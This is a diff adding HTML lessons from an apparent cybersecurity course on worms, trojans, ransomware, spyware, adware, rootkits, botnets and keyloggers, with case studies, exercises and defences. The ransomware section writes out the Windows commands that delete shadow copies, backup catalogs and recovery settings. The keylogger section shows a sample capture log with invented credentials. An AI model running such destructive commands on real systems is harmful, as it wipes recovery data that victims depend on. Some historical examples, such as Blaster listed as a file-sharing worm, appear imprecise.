+        <div class="tl-item"><div class="tl-year">2001</div><div class="tl-title">Code Red Worm</div><div class="tl-desc">Exploited IIS buffer overflow. Infected 359,000 machines in 14 hours. Defaced websites with "HACKED BY CHINESE". DDoS'd White House website. No user interaction — scanned port 80 randomly.</div></div>
+        <div class="tl-item"><div class="tl-year">2003</div><div class="tl-title">SQL Slammer — Fastest Worm Ever</div><div class="tl-desc">Exploited SQL Server buffer overflow (UDP port 1434). Doubled every 8.5 seconds. Infected 75,000 servers in 10 minutes. Caused internet slowdowns, ATM outages, airline check-in failures. Entire worm was 376 bytes!</div></div>
+        <div class="tl-item"><div class="tl-year">2004</div><div class="tl-title">Mydoom Worm</div><div class="tl-desc">Spread via email attachment. Fastest-spreading worm ever at time. Peaked at 1-in-12 emails worldwide. Created DDoS botnet against SCO, Microsoft. $38 billion in damages.</div></div>
+        <div class="tl-item"><div class="tl-year">2010</div><div class="tl-title">Stuxnet — Nation-State Worm</div><div class="tl-desc">Targeted Siemens PLCs in Iranian nuclear centrifuges. Spread via USB, then network shares. Used FOUR zero-days (unprecedented). Physically destroyed ~1,000 centrifuges. First known cyber weapon to cause physical destruction.</div></div>
+        <div class="tl-item"><div class="tl-year">2017</div><div class="tl-title">WannaCry Ransomworm</div><div class="tl-desc">Combined ransomware payload with EternalBlue worm (SMB exploit). 230,000 machines in 150 countries in 24 hours. NHS UK paralysed. Halted by Marcus Hutchins' "kill switch" — registered an unregistered domain.</div></div>
+      </div>
+    </div>
+    <div class="sub"><h3>How Worms Spread — Propagation Methods</h3>
+      <div class="cb"><div class="clbl">WORM PROPAGATION</div><pre><span class="cy">1. Network Scanning (most common):</span>
+   Worm scans random IP ranges on vulnerable port (e.g., 445/SMB)
+   → Finds vulnerable host → exploits it → installs copy → repeats
+   <span class="cd">Example: SQL Slammer scanned all 4 billion IPv4 addresses in 10 mins!</span>
+
+<span class="cy">2. Email Worm:</span>
+   Accesses victim's contact list → sends itself as attachment to all
+   <span class="cd">Example: Mydoom sent itself to all Outlook contacts</span>
+
+<span class="cy">3. Removable Media (USB) Worm:</span>
+   Creates autorun.inf on USB → executes on insertion
+   <span class="cd">Example: Stuxnet spread into air-gapped nuclear facility via USB</span>
+
+<span class="cy">4. P2P/File Sharing:</span>
+   Disguises itself as desirable files on P2P networks
+   <span class="cd">Example: Blaster worm spread via Windows file shares</span>
+
+<span class="cy">5. Instant Messaging:</span>
+   Sends malicious link to all IM contacts
+   <span class="cd">Example: Koobface spread via Facebook messages</span>
+
+<span class="cr"># Why WannaCry spread so fast:</span>
+EternalBlue exploit → port 445 (SMBv1) → no user interaction
+NSA developed EternalBlue → stolen by Shadow Brokers → published April 2017
+Microsoft patched it March 2017 (MS17-010) — most hadn't applied it!</pre></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Why did WannaCry spread so much faster than traditional ransomware? What specific vulnerability enabled this?</li>
+      <li>Why is disabling SMBv1 and applying patches immediately critical defence against worms?</li>
+      <li>Stuxnet spread into an air-gapped (no internet) facility. How? What does this tell us about USB device security?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Worms are the most dangerous malware in terms of propagation speed. When a critical CVE is disclosed, attackers will weaponise it as a worm within days. Patch management is not optional — unpatched systems are the oxygen that worm fires need to spread exponentially.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T76 ===== -->
+<div class="sec" id="t76">
+  <div class="sh"><span class="sn">Topic 76</span><h2>Trojan</h2><span class="tlvl high">HIGH</span><span class="se">🐴</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition</h3>
+      <div class="def"><div class="dl">Definition</div>
+        A <strong>Trojan horse</strong> (or Trojan) is malware that <em>disguises itself as legitimate, desirable software</em> to trick users into installing it. Unlike viruses, Trojans do not self-replicate. They rely on <strong>social engineering</strong> — the user must be deceived into running it.
+      </div>
+    </div>
+    <div class="sub"><h3>Trojan Types</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Trojan Type</th><th>Purpose</th><th>Example</th><th>Typical Vector</th></tr></thead>
+        <tbody>
+          <tr><td>RAT (Remote Access Trojan)</td><td>Full remote control of victim's PC — camera, mic, files, screen</td><td>njRAT, DarkComet, Gh0st RAT, AsyncRAT</td><td>Phishing email, fake software</td></tr>
+          <tr><td>Banking Trojan</td><td>Steals banking credentials via web injection, form grabbing</td><td>Emotet, Zeus, TrickBot, Dridex</td><td>Phishing, malvertising</td></tr>
+          <tr><td>Backdoor Trojan</td><td>Opens persistent hidden access channel to C2 server</td><td>Poison Ivy, NetBus, Sub7</td><td>Pirated software, USB drops</td></tr>
+          <tr><td>Downloader Trojan</td><td>Downloads and installs additional malware</td><td>Emotet (as downloader), Trickbot</td><td>Malicious email attachment</td></tr>
+          <tr><td>Dropper Trojan</td><td>Drops payload on disk then self-destructs</td><td>Stage 1 of most APT toolchains</td><td>Exploit → dropper → payload</td></tr>
+          <tr><td>Info-stealer Trojan</td><td>Harvests credentials, browser data, crypto wallets</td><td>RedLine Stealer, Raccoon, Vidar</td><td>Cracked software, phishing</td></tr>
+          <tr><td>Ransomware Dropper</td><td>Delivers ransomware payload</td><td>Emotet → TrickBot → Ryuk</td><td>Malicious email</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>RAT Deep Dive</h3>
+      <div class="cb"><div class="clbl">RAT CAPABILITIES</div><pre><span class="cr"># RAT (Remote Access Trojan) gives attacker full control:</span>
+<span class="cy">Surveillance:</span>
+  → Live screen capture / screen recording
+  → Webcam activation (often without indicator light)
+  → Microphone recording
+  → Screenshot at intervals
+
+<span class="cy">Data theft:</span>
+  → File browser — browse, download, upload, delete files
+  → Credential harvesting — browser passwords, saved passwords
+  → Clipboard monitoring — captures copied passwords
+  → Keystroke logging
+
+<span class="cy">System control:</span>
+  → Remote shell — execute any command
+  → Process management — kill AV/EDR processes
+  → Registry manipulation — add persistence keys
+  → DDoS participation — use victim as bot
+
+<span class="cd"># Notable RAT attack — Operation Aurora 2009:</span>
+<span class="cd"># Chinese APT (Elderwood group) used Poison Ivy RAT</span>
+<span class="cd"># Targeted: Google, Adobe, Juniper Networks, 33+ companies</span>
+<span class="cd"># Entry: spear-phishing email → IE zero-day exploit → RAT installed</span>
+<span class="cd"># Goal: steal source code, access Gmail accounts of Chinese activists</span>
+
+<span class="cg"># Defence: EDR, application allowlisting, network monitoring for C2 traffic</span></pre></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>You download "Photoshop_crack_2024.exe" from a torrent site. What type of malware is likely bundled? What could the attacker now do?</li>
+      <li>Emotet is described as a "dropper." Explain the Emotet → TrickBot → Ryuk ransomware kill chain.</li>
+      <li>How does a banking Trojan use web injection to steal credentials even over HTTPS?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Trojans are the most deployed malware type because they bypass technical defences using human psychology. The user installs them voluntarily, believing they're getting something useful. Defence begins with user education, followed by application control (allowlisting) and endpoint detection that catches suspicious behaviour post-execution.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T77 ===== -->
+<div class="sec" id="t77">
+  <div class="sh"><span class="sn">Topic 77</span><h2>Ransomware</h2><span class="tlvl crit">CRITICAL</span><span class="se">💰</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition</h3>
+      <div class="def"><div class="dl">Definition</div>
+        <strong>Ransomware</strong> is malware that encrypts a victim's files or locks their system, then demands payment (ransom) — typically in cryptocurrency — for the decryption key. Modern ransomware operations use <strong>double extortion</strong>: encrypt AND exfiltrate data, threatening to publish it publicly if ransom is unpaid.
+      </div>
+    </div>
+    <div class="sub"><h3>Ransomware Kill Chain</h3>
+      <div class="flow">
+        <div class="fn s">1️⃣ INITIAL ACCESS — Phishing email / RDP brute force / VPN exploit</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">2️⃣ EXECUTION — Malicious attachment opens, dropper installs ransomware loader</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">3️⃣ PRIVILEGE ESCALATION — Gain admin rights to access more files</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">4️⃣ LATERAL MOVEMENT — Spread to other systems (file shares, backups)</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">5️⃣ DATA EXFILTRATION — Copy sensitive data to attacker server (double extortion)</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn w">6️⃣ ENCRYPTION — AES-256 encrypts files; RSA-2048 protects AES key</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn" style="border-color:var(--red);color:var(--red)">7️⃣ RANSOM NOTE — Bitcoin wallet shown; 72hr countdown; leak site threat</div>
+      </div>
+    </div>
+    <div class="sub"><h3>Ransomware Cryptography</h3>
+      <div class="cb"><div class="clbl">HOW RANSOMWARE ENCRYPTION WORKS</div><pre><span class="cy"># Why victim CANNOT decrypt without paying:</span>
+
+<span class="cg">Attacker:</span>
+  1. Generates RSA-2048 key pair (on C2 server)
+  2. Embeds RSA PUBLIC key in ransomware binary
+
+<span class="cg">On victim machine:</span>
+  3. Ransomware generates unique AES-256 key per file (or session)
+  4. Encrypts each file with its AES-256 key
+  5. Encrypts the AES key with RSA PUBLIC key → stores in file header
+  6. DELETES the plaintext AES key from memory
+
+<span class="cg">Result:</span>
+  File:   [RSA_encrypted(AES_key)] + [AES_encrypted(file_data)]
+  Only RSA PRIVATE KEY (with attacker) can decrypt AES key
+  → Victim CANNOT recover AES key without paying
+
+<span class="cr"># Shadow copy deletion (standard ransomware technique):</span>
+vssadmin delete shadows /all /quiet
+wbadmin delete catalog -quiet
+bcdedit /set {default} recoveryenabled No
+<span class="cr"># Destroys Windows backup volumes before encrypting</span>
+
+<span class="cg"># Defence:</span>
+→ 3-2-1 backup rule: 3 copies, 2 media, 1 offsite/offline
+→ Offline backups: air-gapped or immutable (S3 Object Lock)
+→ Canary files: honeypot files alert on encryption attempts</pre></div>
+    </div>
+    <div class="sub"><h3>Notable Ransomware Attacks</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Attack</th><th>Year</th><th>Impact</th><th>Ransom</th><th>Key Fact</th></tr></thead>
+        <tbody>
+          <tr><td>WannaCry</td><td>2017</td><td>230,000 machines, 150 countries, NHS paralysed</td><td>$300 BTC (most unpaid)</td><td>SMBv1 EternalBlue + worm = unprecedented spread</td></tr>
+          <tr><td>NotPetya</td><td>2017</td><td>$10B damages; Maersk, Merck, FedEx, Mondelez</td><td>Fake ransom — WIPER</td><td>Russian nation-state attack disguised as ransomware</td></tr>
+          <tr><td>Colonial Pipeline</td><td>2021</td><td>US East Coast fuel shortage; 5,700 miles of pipeline</td><td>$4.4M (most recovered)</td><td>Single compromised VPN password; no MFA</td></tr>
+          <tr><td>REvil/Kaseya</td><td>2021</td><td>1,500 businesses via MSP supply chain</td><td>$70M demanded</td><td>VSA zero-day; attacked IT management software provider</td></tr>
+          <tr><td>NHS Barts (LockBit)</td><td>2023</td><td>UK's largest NHS Trust; 7TB data stolen</td><td>Not disclosed</td><td>Patient data leaked publicly after non-payment</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>Ransomware-as-a-Service (RaaS)</h3>
+      <div class="ib r"><span class="bi">💼</span><div><strong>Ransomware-as-a-Service (RaaS):</strong> Criminal groups like LockBit, BlackCat, and Hive operate like software companies. They develop ransomware and lease it to "affiliates" (less skilled criminals) for a 20-30% cut of ransoms. The affiliate handles infection, negotiation, and payment. The developer provides the ransomware kit, leak site, customer service (!), and cryptocurrency laundering. This lowered the skill barrier to launching ransomware attacks dramatically.</div></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Why does ransomware use asymmetric encryption (RSA) to protect the symmetric key (AES) rather than just using AES directly?</li>
+      <li>The Colonial Pipeline attack started with a compromised VPN password. What single security control would have prevented it?</li>
+      <li>Design a backup strategy that would allow a company to recover from ransomware within 4 hours without paying.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Ransomware is the most economically damaging cyber threat today. The industrialisation of RaaS means any criminal can now deploy sophisticated ransomware. Defences: offline/immutable backups (the only true counter), MFA everywhere, patch management, network segmentation to limit spread, and email filtering.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T78 ===== -->
+<div class="sec" id="t78">
+  <div class="sh"><span class="sn">Topic 78</span><h2>Spyware</h2><span class="tlvl high">HIGH</span><span class="se">👁️</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition</h3>
+      <div class="def"><div class="dl">Definition</div>
+        <strong>Spyware</strong> secretly monitors a user's activities and transmits information to a remote party without the user's knowledge or consent. It operates silently in the background, designed to be undetectable while gathering credentials, personal data, communications, and behavioural patterns.
+      </div>
+    </div>
+    <div class="sub"><h3>Spyware Capabilities</h3>
+      <div class="cg2">
+        <div class="card"><div class="ci2">⌨️</div><div class="ct">Keystroke Logging</div><div class="cd2">Records every key pressed — passwords, messages, credit cards, PIN numbers.</div></div>
+        <div class="card"><div class="ci2">📸</div><div class="ct">Screenshots</div><div class="cd2">Periodic screen captures. Sends to C2. Captures banking portals, sensitive documents.</div></div>
+        <div class="card"><div class="ci2">📷</div><div class="ct">Webcam / Mic</div><div class="cd2">Silently activates camera and microphone. Used in surveillance of high-value targets.</div></div>
+        <div class="card"><div class="ci2">📍</div><div class="ct">Location Tracking</div><div class="cd2">GPS coordinates (mobile spyware). Movement patterns, visited locations, travel behaviour.</div></div>
+        <div class="card"><div class="ci2">💬</div><div class="ct">Message Interception</div><div class="cd2">Reads SMS, WhatsApp, iMessage, Signal (at OS level — bypasses E2EE). Pegasus capability.</div></div>
+        <div class="card"><div class="ci2">🌐</div><div class="ct">Browser History</div><div class="cd2">All visited URLs, search queries, saved passwords, cookies, browsing patterns.</div></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Pegasus Spyware — Advanced Case Study</h3>
+      <div class="cb"><div class="clbl">PEGASUS SPYWARE (NSO GROUP)</div><pre><span class="cy">Developer:</span> NSO Group (Israel) — commercial spyware sold to governments
+<span class="cy">Target:</span>    Journalists, activists, politicians, government officials
+<span class="cy">Cost:</span>      ~$500,000+ per deployment license
+
+<span class="cy">Technical capabilities:</span>
+→ Zero-click installation (no user interaction required!)
+→ Exploits iMessage, WhatsApp zero-days
+→ Achieves kernel-level access on iOS and Android
+→ Reads ALL messages (including E2EE Signal, WhatsApp) from memory
+→ Activates camera and microphone silently
+→ Extracts encryption keys from device
+→ Self-destructs if it detects forensic analysis
+
+<span class="cy">Notable targets:</span>
+→ Jamal Khashoggi (journalist, later murdered) — Saudi Arabia
+→ Emmanuel Macron (French President) — suspected
+→ 50,000 phone numbers in leaked list (2021 Amnesty International)
+→ 14 world leaders' numbers on targeting list
+
+<span class="cr">Key lesson: Even fully patched, updated devices can be compromised</span>
+<span class="cr">by nation-state spyware using zero-click zero-days</span>
+
+<span class="cg">Detection: Amnesty International Mobile Verification Toolkit (MVT)</span></pre></div>
+    </div>
+    <div class="sub"><h3>Spyware vs Legitimate Monitoring</h3>
+      <div class="ib g"><span class="bi">⚖️</span><div><strong>Legal grey area:</strong> Parental control software, employee monitoring tools, and law enforcement lawful interception all share technical similarities with spyware. The distinction is: <strong>consent and disclosure</strong>. Spyware = installed covertly without consent. Legitimate monitoring = disclosed (employee handbook, terms of service, court order). GDPR requires explicit consent for monitoring — covert monitoring of employees without disclosure is illegal in the EU.</div></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Pegasus can read Signal messages despite their end-to-end encryption. Explain how this is possible (hint: it's not breaking the encryption).</li>
+      <li>What is the difference between spyware and a keylogger? Could one tool be both?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Spyware represents the surveillance dimension of malware. Commercial spyware like Pegasus demonstrates that even state-of-the-art security can be bypassed with sufficient resources. For most users, defence means patching immediately, avoiding suspicious links, and being aware that any device can potentially be compromised.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T79 + T80 ===== -->
+<div class="sec" id="t79">
+  <div class="sh"><span class="sn">Topic 79</span><h2>Adware</h2><span class="tlvl low">LOW-MED</span><span class="se">📢</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition &amp; Characteristics</h3>
+      <div class="def"><div class="dl">Definition</div>
+        <strong>Adware</strong> automatically delivers unwanted advertisements to generate revenue for the attacker. Usually bundled with free software (PUP — Potentially Unwanted Program). While less damaging than other malware, adware is often a gateway to more serious infections and degrades system performance.
+      </div>
+    </div>
+    <div class="sub"><h3>Adware Behaviours &amp; Risks</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Behaviour</th><th>Impact</th><th>Security Risk</th></tr></thead>
+        <tbody>
+          <tr><td>Pop-up ads</td><td>Disrupts workflow, degrades performance</td><td>Malvertising — ads can contain exploits or redirect to phishing</td></tr>
+          <tr><td>Browser hijacking</td><td>Changes homepage, search engine, installs extensions</td><td>Fake search results, phishing redirects, credential theft</td></tr>
+          <tr><td>Tracking &amp; profiling</td><td>Monitors browsing habits, sells data to advertisers</td><td>Privacy violation, targeted phishing using personal data</td></tr>
+          <tr><td>Bundled installation</td><td>Installs alongside legitimate software (default yes)</td><td>Often bundles additional malware or PUPs</td></tr>
+          <tr><td>Fake update prompts</td><td>Tricks user into installing more malware</td><td>Classic vector: "Flash Player update required" → Trojan</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="ib o"><span class="bi">⚠️</span><div><strong>Adware → Serious Malware Gateway:</strong> Adware often enables drive-by download attacks. A malicious ad (malvertising) can contain JavaScript exploits that silently install ransomware or Trojans when clicked — or even just viewed (zero-click exploits). The 2016 Angler exploit kit used malvertising on major news sites to deploy CryptoWall ransomware. No suspicious downloads required.</div></div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>You download a free video converter and notice your browser homepage changed and you see constant ads. What happened? How do you remove it?</li>
+      <li>What is malvertising? Why is it dangerous even on reputable websites?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Never install software from unofficial sources, always use custom install (uncheck bundled offers), install an ad blocker (uBlock Origin), and keep browsers updated. Adware is the "gateway drug" of malware — it signals a compromised security posture that more dangerous threats will exploit.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T80 ===== -->
+<div class="sec" id="t80">
+  <div class="sh"><span class="sn">Topic 80</span><h2>Rootkits</h2><span class="tlvl crit">CRITICAL</span><span class="se">🕳️</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition</h3>
+      <div class="def"><div class="dl">Definition</div>
+        A <strong>rootkit</strong> is malware designed to hide itself and other malicious processes from the operating system, security tools, and users — while maintaining privileged (root/admin) access. The name combines "root" (Unix superuser) and "kit" (set of tools). Rootkits modify OS core functions to conceal their presence.
+      </div>
+    </div>
+    <div class="sub"><h3>Rootkit Types by Privilege Level</h3>
+      <div class="cb"><div class="clbl">ROOTKIT PRIVILEGE LEVELS</div><pre><span class="cy">Ring 0 — Kernel Rootkit (most dangerous)</span>
+  Operates at kernel level — highest OS privilege
+  Can intercept ANY system call, hide ANY file/process
+  <span class="cr">Example: Necurs, ZeroAccess — hide from all AV/EDR tools</span>
+  Detection: Compare running process list via API vs raw disk scan
+
+<span class="cy">Ring -1 — Hypervisor Rootkit (virtualization-based)</span>
+  Moves OS into VM, sits BELOW the OS
+  OS cannot detect it — it's in a different privilege level
+  <span class="cr">Example: Blue Pill (proof-of-concept), Vbootkit</span>
+
+<span class="cy">Ring -2/-3 — Firmware/UEFI Rootkit (most persistent)</span>
+  Flashed into UEFI/BIOS firmware or hard drive firmware
+  Survives OS reinstall, full disk wipe
+  <span class="cr">Example: LoJax (APT28/Fancy Bear), CosmicStrand, MosaicRegressor</span>
+  Detection: UEFI firmware integrity check tools
+
+<span class="cy">Ring 3 — User-mode Rootkit (application level)</span>
+  Hooks Windows API calls (DLL injection, API hooking)
+  Hides files, processes, network connections at API level
+  Easier to detect — doesn't control kernel
+  <span class="cd">Example: Hacker Defender (Windows)</span>
+
+<span class="cy">Bootkit</span>
+  Infects Master Boot Record (MBR) or VBR
+  Loads before OS — can intercept boot process
+  <span class="cr">Example: TDL4/Alureon, Rovnix</span></pre></div>
+    </div>
+    <div class="sub"><h3>How Rootkits Hide</h3>
+      <div class="tw"><table>
+        <thead><tr><th>What's Hidden</th><th>Technique</th><th>Detection Method</th></tr></thead>
+        <tbody>
+          <tr><td>Files/directories</td><td>Hook FindFirstFile/FindNextFile API — filter out rootkit files from results</td><td>Compare API results vs raw disk sector scan</td></tr>
+          <tr><td>Running processes</td><td>Remove process from kernel DKOM (Direct Kernel Object Manipulation) linked list</td><td>Cross-view detection — multiple process enumeration methods</td></tr>
+          <tr><td>Network connections</td><td>Hook socket/TCP table APIs — remove C2 connections from netstat output</td><td>Raw network packet capture vs API comparison</td></tr>
+          <tr><td>Registry keys</td><td>Hook RegQueryKey/RegEnumKey — hide persistence keys</td><td>Offline registry hive analysis</td></tr>
+          <tr><td>Loaded drivers</td><td>Remove from kernel driver list</td><td>Memory forensics (volatility framework)</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Why is a UEFI rootkit more dangerous than a kernel rootkit? What would you have to do to remove it?</li>
+      <li>You run antivirus and it shows no infections, but your computer is behaving suspiciously. What might this indicate and how would you investigate?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Rootkits represent the apex of malware stealth. A system with a kernel or UEFI rootkit cannot be trusted — the only safe remediation is complete system rebuild from verified media. Prevention through Secure Boot, UEFI passwords, and EDR tools with kernel protection (PatchGuard) is far more effective than trying to remove them.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T81 ===== -->
+<div class="sec" id="t81">
+  <div class="sh"><span class="sn">Topic 81</span><h2>Botnets</h2><span class="tlvl crit">CRITICAL</span><span class="se">🤖</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition</h3>
+      <div class="def"><div class="dl">Definition</div>
+        A <strong>botnet</strong> is a network of internet-connected devices infected with malware and controlled by an attacker (the <em>botmaster</em>) via a Command and Control (C2) server. Each infected device is called a <em>bot</em> or <em>zombie</em>. Botnets can contain thousands to millions of devices and are rented out for criminal purposes.
+      </div>
+    </div>
+    <div class="sub"><h3>Botnet Architecture</h3>
+      <div class="cb"><div class="clbl">BOTNET C2 ARCHITECTURE</div><pre><span class="cy">Traditional Centralised C2:</span>
+          [Botmaster]
+               │
+          [C2 Server] ← single point of failure
+         /     │     \
+    [Bot1] [Bot2] [Bot3] ... [BotN]
+    <span class="cr">Weakness: Take down C2 = destroy botnet (sinkholing)</span>
+
+<span class="cy">P2P Distributed C2 (more resilient):</span>
+    [Bot1] ↔ [Bot2] ↔ [Bot3]
+      ↕                  ↕
+    [Bot4] ↔ [Bot5] ↔ [Bot6]
+    <span class="cd">Bots relay commands to each other — no single C2 server</span>
+    <span class="cd">Botmaster sends commands via any bot in the network</span>
+    <span class="cg">Much harder to disrupt — used by Storm, Necurs, Gameover ZeuS</span>
+
+<span class="cy">Domain Generation Algorithm (DGA) C2:</span>
+    Botnet generates hundreds of domain names daily from seed
+    Attacker only needs to register ONE — bot will eventually find it
+    <span class="cd">Example: Conficker generated 50,000 domains per day</span>
+    <span class="cg">Defence: Precompute DGA domains and register/sinkhole them first</span>
+
+<span class="cy">Fast-flux DNS:</span>
+    C2 domain resolves to hundreds of different IPs (botted machines)
+    IPs change every 3-5 minutes → takedown is impossible</pre></div>
+    </div>
+    <div class="sub"><h3>What Botnets Do</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Use</th><th>Description</th><th>Real Example</th><th>Criminal Revenue</th></tr></thead>
+        <tbody>
+          <tr><td>DDoS-for-hire</td><td>Flood target with traffic, crash services</td><td>Mirai DDoS'd Dyn DNS (took down Twitter, Netflix, Reddit)</td><td>$10–$10,000 per attack</td></tr>
+          <tr><td>Spam email</td><td>Send billions of phishing/spam emails</td><td>Necurs botnet: 45 billion spam emails/day in peak</td><td>$0.001–0.01 per 1000 emails</td></tr>
+          <tr><td>Credential stuffing</td><td>Test stolen credentials across websites</td><td>Sentry MBA botnet for account takeover</td><td>$10–100 per valid credential</td></tr>
+          <tr><td>Cryptomining</td><td>Mine Monero/Bitcoin using victim's CPU/GPU</td><td>Smominru: 500,000 bots, $3.6M Monero mined</td><td>$0.5–2/month per bot</td></tr>
+          <tr><td>Click fraud</td><td>Simulate ad clicks to generate revenue</td><td>3ve botnet: 1.7 billion fake ad views/day</td><td>Hundreds of millions/year</td></tr>
+          <tr><td>Proxy services</td><td>Route criminal traffic through infected homes</td><td>IPStorm: 23,000 residential proxies</td><td>$1–5 per proxy per month</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>Mirai Botnet — IoT Case Study</h3>
+      <div class="ib r"><span class="bi">🌐</span><div><strong>Mirai (2016):</strong> Scanned the internet for IoT devices with default credentials (root/root, admin/1234, etc.). Infected 600,000 IoT devices — cameras, DVRs, routers. Launched 620 Gbps DDoS against journalist Brian Krebs. Then targeted Dyn DNS — took down Twitter, Netflix, Reddit, Spotify, GitHub, Amazon for 11 hours. The entire source code was leaked, spawning hundreds of Mirai variants still active today. Lesson: <strong>change default passwords on ALL IoT devices immediately.</strong></div></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Why is a P2P botnet harder to take down than a centralised C2 botnet? What technique would law enforcement use against each?</li>
+      <li>How did Mirai infect 600,000 IoT devices without using any exploit? What does this tell us about IoT security?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Botnets are the infrastructure of cybercrime. Your home router, baby monitor, or smart TV could be a botnet member right now — working for criminals without any visible symptoms. Defence: change default credentials, network segmentation for IoT devices, and ISP-level traffic monitoring (BCP38 to prevent spoofed DDoS traffic).</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T82 ===== -->
+<div class="sec" id="t82">
+  <div class="sh"><span class="sn">Topic 82</span><h2>Keyloggers</h2><span class="tlvl high">HIGH</span><span class="se">⌨️</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition &amp; Types</h3>
+      <div class="def"><div class="dl">Definition</div>
+        A <strong>keylogger</strong> records every keystroke made on a keyboard, capturing passwords, messages, credit card numbers, and any other typed data. Keyloggers can be <strong>software-based</strong> (installed as malware) or <strong>hardware-based</strong> (physical devices plugged between keyboard and computer).
+      </div>
+    </div>
+    <div class="sub"><h3>Software vs Hardware Keyloggers</h3>
+      <div class="cmp">
+        <div class="cp2 r"><h4>💻 Software Keyloggers</h4><ul>
+          <li>Installed as malware (Trojan dropper)</li>
+          <li>Hooks Windows keyboard API (SetWindowsHookEx)</li>
+          <li>Kernel-level: captures ALL keystrokes OS-wide</li>
+          <li>User-level: only captures target application</li>
+          <li>Sends logs via email/FTP/HTTP to attacker</li>
+          <li>Detectable by AV/EDR (if not rootkitted)</li>
+          <li>Examples: Spyrix, Revealer, HawkEye, Agent Tesla</li>
+        </ul></div>
+        <div class="cp2 i"><h4>🔌 Hardware Keyloggers</h4><ul>
+          <li>Physical device between keyboard and USB port</li>
+          <li>Completely invisible to OS — no software to detect</li>
+          <li>Works on any OS, no installation required</li>
+          <li>Stores logs internally; attacker retrieves device later</li>
+          <li>KeyGrabber, KeyGhost, KeyCarbon devices</li>
+          <li>WiFi variants: transmit logs wirelessly</li>
+          <li>BIOS keylogger: firmware-level, survives reinstall</li>
+        </ul></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Keylogger Output Example</h3>
+      <div class="cb"><div class="clbl">KEYLOGGER CAPTURE LOG</div><pre><span class="cd"># Example keylogger output file (what attacker receives):</span>
+<span class="cy">[2024-03-15 09:23:14] [Chrome]</span>
+www.barclays.co.uk<span class="cr">[ENTER]</span>
+
+<span class="cy">[2024-03-15 09:24:05] [Chrome — Barclays Online Banking]</span>
+Username: alice.smith@gmail.com<span class="cr">[TAB]</span>
+Password: MyBank<span class="cr">[BACKSPACE]</span><span class="cr">[BACKSPACE]</span><span class="cr">[BACKSPACE]</span>Password_2024!<span class="cr">[ENTER]</span>
+
+<span class="cy">[2024-03-15 09:45:30] [WhatsApp Web]</span>
+Hey Bob, the meeting is at 3pm. My new card number is 4532<span class="cr">[SPACE]</span>
+1234<span class="cr">[SPACE]</span>5678<span class="cr">[SPACE]</span>9012 expiry 05/27 CVV 123<span class="cr">[ENTER]</span>
+
+<span class="cd"># Attacker also receives screenshots every 30 seconds</span>
+<span class="cd"># and clipboard contents when Copy is pressed</span>
+
+<span class="cg"># Why on-screen keyboards DON'T help:</span>
+<span class="cg">→ Software keyloggers can take screenshots of on-screen keyboard clicks</span>
+<span class="cg">→ Only hardware security keys (FIDO2/passkeys) are truly immune to keyloggers</span></pre></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>You are a security auditor at a library. How would you detect a hardware keylogger on a public computer?</li>
+      <li>Why does using a password manager (auto-fill) provide some protection against software keyloggers?</li>
+      <li>MFA (TOTP codes) adds some protection against keyloggers. Explain why — and why it's not complete protection.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Keyloggers are devastatingly effective credential harvesters. The best defences: password managers with auto-fill (reduces typing), MFA on all accounts (stolen password alone insufficient), hardware security keys (FIDO2 — completely immune to keyloggers), and physical security checks on shared/public computers.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T83 ===== -->
